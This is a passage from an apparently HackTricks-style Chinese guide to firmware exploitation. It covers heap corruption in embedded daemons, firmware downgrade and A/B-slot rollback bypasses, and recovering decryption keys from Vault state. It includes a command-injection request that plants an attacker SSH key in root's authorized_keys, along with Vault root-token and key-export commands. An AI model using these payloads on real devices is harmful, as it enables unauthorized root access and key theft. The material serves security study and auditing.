- 伪造 packet-local size，使其满足新一轮检查，同时仍然溢出最初分配的 buffer。

如果易受攻击的路径位于 commissioning logic 之后，利用时必须进行足够的 **device emulation**，让目标进入预期的 model-download 或 blob-download 状态，然后再发送格式错误的 fragment。

### 由 protocol 驱动的 `free()` 触发方式

在 embedded daemon 中，触发 heap metadata exploitation 最简单的方法往往不是“等待清理”，而是**触发 protocol 自身的错误处理**：<sup>[[8]](#references)</sup>

- 发送格式错误的后续 fragment，让 FSM 进入 **retry** 或 **error** state。
- 超过 retry 阈值，使 daemon **reset context** 并释放被破坏的 buffer。
- 利用这个可预测的 `free()`，在进程因其他原因崩溃之前触发 allocator 侧 primitive。

这对 embedded Linux 上的 **musl/uClibc/dlmalloc-like** allocator 特别有用，因为破坏 chunk metadata 可以将 unlink/unbin logic 转化为 write primitive。一种稳定的做法是破坏 **size field**，让 allocator 遍历溢出 buffer 内预先布置的 **fake chunk**，而不是立即覆盖真实的 bin pointer 并导致进程崩溃。

## Binary Exploitation 和 Proof-of-Concept

为已识别的漏洞开发 PoC，需要深入理解目标架构并使用较低层级的语言编程。嵌入式系统中很少启用 binary runtime protection，但如果存在，可能就需要使用 Return Oriented Programming (ROP) 等技术。

### uClibc fastbin exploitation 说明（embedded Linux）

- **Fastbins + consolidation：**uClibc 使用与 glibc 类似的 fastbin。后续的大内存分配可能触发 `__malloc_consolidate()`，因此任何 fake chunk 都必须通过相关检查（size 合理、`fd = 0`，并且周围的 chunk 要被视为“in use”）。<sup>[[6]](#references)</sup>
- **ASLR 下的 non-PIE binary：**如果启用了 ASLR，但主 binary 是 **non-PIE**，binary 内部的 `.data/.bss` 地址仍然稳定。可以将目标设为一个外观上已符合有效 heap chunk header 的区域，让 fastbin allocation 落在 **function pointer table** 上。
- **让 parser 停止解析的 NUL：**解析 JSON 时，payload 中的 `\x00` 可以停止解析，同时保留其后的攻击者可控字节，用于 stack pivot/ROP chain。
- **通过 `/proc/self/mem` 执行 shellcode：**调用 `open("/proc/self/mem")`、`lseek()` 和 `write()` 的 ROP chain，可以将可执行 shellcode 写入已知 mapping 并跳转执行。

## 用于 Firmware Analysis 的预配置操作系统

[AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 等操作系统提供了预配置环境，用于 firmware security testing，并配备所需工具。

## 用于 Firmware 分析的预配置 OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos)：AttifyOS 是一个用于对 Internet of Things (IoT) 设备进行 security assessment 和 penetration testing 的发行版。它提供了预配置环境并加载所有必要工具，能为你节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS)：基于 Ubuntu 18.04 的 embedded security testing 操作系统，预装了 firmware security testing 工具。

## Firmware Downgrade Attack 和不安全的 Update Mechanism

即使 vendor 为 firmware image 实现了 cryptographic signature check，**version rollback（downgrade）保护也经常被省略**。如果 boot- 或 recovery-loader 只使用内置 public key 验证 signature，却不比较待刷入 image 的 *version*（或 monotonic counter），攻击者就可以合法安装**仍带有有效 signature 的旧版易受攻击 firmware**，从而重新引入已修复的漏洞。<sup>[[4]](#references)</sup>

典型攻击流程：

1. **获取较旧的 signed image**
   * 从 vendor 的公开下载门户、CDN 或 support site 获取。
   * 从配套的 mobile/desktop application 中提取（例如 Android APK 的 `assets/firmware/` 目录中）。
   * 从 VirusTotal、Internet archive、forum 等第三方仓库获取。
2. 通过任何暴露的 update channel 将 image 上传或提供给设备：
   * Web UI、mobile-app API、USB、TFTP、MQTT 等。
   * 许多 consumer IoT 设备会暴露*未经身份验证*的 HTTP(S) endpoint，接受 Base64 编码的 firmware blob，在 server 端解码并触发 recovery/upgrade。
3. Downgrade 后，利用在较新版本中已修复的漏洞（例如后来添加的 command-injection filter）。
4. 获得 persistence 后，可选择刷回最新 image 或禁用 update，以避免被发现。

### 示例：Downgrade 后的 Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

在存在漏洞的（已降级）固件中，`md5` 参数未经净化便直接拼接到 shell 命令中，从而允许注入任意命令（此处用于启用基于 SSH key 的 root 访问权限）。后续固件版本加入了基本的字符过滤，但由于缺少防降级保护，这项修复形同虚设。<sup>[[4]](#references)</sup>

### 从移动应用中提取固件

许多厂商会将完整的固件映像打包到配套的移动应用中，以便应用通过 Bluetooth/Wi-Fi 更新设备。这些软件包通常未加密，存储在 APK/APEX 中的 `assets/fw/` 或 `res/raw/` 等路径下。使用 `apktool`、`ghidra` 甚至普通的 `unzip` 等工具，即可提取已签名的映像，无需接触实体硬件。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot 设计中仅在 updater 中实现的 anti-rollback bypass

有些厂商确实实现了 anti-downgrade **ratchet**，但它只存在于 *updater* 逻辑中（例如通过 CAN 运行的 UDS routine、recovery command 或 userspace OTA agent）。如果 **bootloader** 后续只检查 image signature/CRC，并信任 partition table 或 slot metadata，仍然可以绕过 rollback protection。<sup>[[7]](#references)</sup>

典型的弱设计：

- Firmware metadata 同时包含 version descriptor 和 **security ratchet** / monotonic counter。
- Updater 将 image ratchet 与 persistent storage 中保存的值进行比较，并拒绝较旧的 signed image。
- **Bootloader** 不会解析该 ratchet，只会在启动所选 slot 前验证 header、CRC 和 signature。
- Slot activation 单独存储在 partition table 或 per-slot generation counter 中，且**没有通过密码学方式绑定**到已验证的确切 firmware digest。

这会在 dual-slot 系统中形成 **validate-one-image / boot-another-image** primitive。如果攻击者能让 updater 使用当前的 signed image 将 slot B 标记为下次启动目标，并能在重启前覆盖 slot B，bootloader 仍可能启动降级后的 image，因为它只信任已经提交的 slot metadata。

常见的滥用方式：

1. 将一份**当前的 signed** firmware 上传到被动 slot，并运行正常的 validation/switch routine，使 layout 将该 slot 标记为下一个 active slot。
2. **暂时不要重启**。在同一 session 中重新进入 slot-preparation/erase routine。
3. 滥用过时的 boot-state 或 slot-selection 逻辑，使 updater 擦除刚刚被提升的**同一个物理 slot**。
4. 将一份**较旧但仍为 signed** 的 firmware 写入该 slot。
5. 跳过执行 ratchet 检查的 validation routine，直接重启。
6. Bootloader 选择已提升的 slot，只验证 signature/integrity，随后启动旧 image。

逆向分析 A/B update 实现时需要关注：

- Slot selection 是否基于**启动时的 flags**，且成功切换后不会刷新这些 flags。
- `prepare_passive_slot()` 风格的 routine 是否根据过时状态擦除 slot，而不是依据**当前已提交的 layout**。
- `part_write_layout()` 风格的 function 是否只递增 **generation counter** / active flag，而不保存已验证 image 的 hash。
- Ratchet 检查是否只在 userspace 或 updater 代码中实现，**而未在 ROM / bootloader / secure boot 阶段实现**。
- Erase 或 recovery routine 是否会在 slot 内容被删除并重写后，仍将其标记为可启动。

### 评估 Update Logic 的检查清单

* *Update endpoint* 的传输/认证是否得到充分保护（TLS + authentication）？
* 设备是否在刷写前比较 **version numbers** 或 **monotonic anti-rollback counter**？
* Image 是否在 secure boot chain 中得到验证（例如由 ROM code 检查 signatures）？
* **Bootloader 是否执行与 updater 相同的 ratchet**，而不是只检查 signature/CRC？
* Slot activation metadata 是否**绑定到经过验证的 firmware digest/version**，还是 slot 在提升后仍可被修改？
* Slot 切换成功后，设备是否会被强制重启，还是同一 session 中仍可调用后续的 update/erase routines？
* Userland 代码是否执行额外的 sanity checks（例如检查允许的 partition map、model number）？
* *Partial* 或 *backup* update flows 是否复用了相同的 validation logic？

> 💡  如果上述任何一项缺失，该平台很可能容易受到 rollback attacks 的攻击。

## 可用于练习的 Vulnerable firmware

要练习发现 firmware 中的漏洞，可以从以下 vulnerable firmware 项目入手。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 从嵌入式 KMS/Vault 状态中恢复 firmware decryption keys

当 update image 将少量明文 metadata 与大型高熵 blob 混合在一起时，应先进行容器初步分析，再尝试暴力破解：<sup>[[1]](#references)</sup>

- 使用 `hexdump`、`xxd`、`strings -tx`、`base64 -d` 和 `binwalk -E` 导出 headers、offsets 和行边界。
- `Salted__` 通常表示 OpenSSL `enc` 格式：接下来的 8 个字节是 salt，其余字节是 ciphertext。
- 如果某个 Base64 字段解码后正好是 `256` 字节，这是一个强烈的线索，表明它可能是 RSA-2048 ciphertext，用于封装随机生成的 firmware password/session key。
- 同一文件中的 Detached PGP material 通常只用于保护真实性；不要假设它是用于保密的机制。

如果静态密钥搜索（`grep`、`strings`、PEM/PGP 搜索）没有结果，应逆向分析**实际运行的解密路径**，而不只是搜索 private keys：

- 反编译 updater / management binary，并追踪读取加密 blob 的对象、用于解封装的 helper/API，以及它请求的逻辑密钥名称。
- 在提取出的 root filesystem 中搜索 KMS 状态（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`），以及 unit files 和 init scripts。
- 将明文 `vault operator unseal ...`、recovery keys、bootstrap tokens 或本地 KMS auto-unseal scripts 视同 private-key material。

如果 appliance 附带原始 Vault binary 和 storage backend，重现该环境通常比重新实现 Vault 内部机制更简单：

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

在克隆的 KMS 上取得 root 权限后：

- 仅在隔离的克隆环境中将 transit keys 设为可导出：`vault write transit/keys/<name>/config exportable=true`
- 导出 unwrap key：`vault read transit/export/encryption-key/<name>`
- 使用 KMS 实际采用的 padding/hash 组合尝试恢复的 RSA key。PKCS#1 v1.5 解密失败，以及默认 OAEP 解密失败，**都不能**证明 key 有误；许多基于 Vault 的流程使用 SHA-256 的 OAEP，而常见库默认使用 SHA-1。
- 如果 payload 以 `Salted__` 开头，在尝试 AES-CBC 解密前，先精确复现供应商的 OpenSSL KDF（`EVP_BytesToKey`，旧款设备通常使用 MD5）。

这样一来，“加密固件”就变成了一个更通用的问题：**恢复设备端的操作密钥，然后离线复现完全一致的 unwrap + KDF 参数**。

## 培训与认证

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [使用 Claude 破解固件：高级技能，初级自主性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [固件安全测试方法论](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [实用 IoT Hacking：攻击物联网的权威指南](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [利用废弃硬件中的 zero day 漏洞——Trail of Bits 博客](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [一台 20 美元的智能设备如何让我访问你的家](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [现在你看到了 mi：现在你被 Pwn 了](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 利用 Tesla Wall Connector 的充电端口接口 - 第 2 部分：绕过防降级机制](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [让它闪烁：通过无线更新利用 Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [在 QEMU 上获取 Tesla OS ROOT 权限，第 1 部分：解包](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux 内核文档 - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [在 QEMU 上获取 Tesla OS ROOT 权限，第 2 部分：调试与修复](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS Passwords：弱 XOR 加密可从 SPI Flash 中恢复密码（CVE-2026-40639）](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS 密码恢复工具](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — 硬件 Hacking 基础复习，第 2 部分](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [我们如何以及为何 Hacked Cypherock Hardware Wallet：完整经过](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
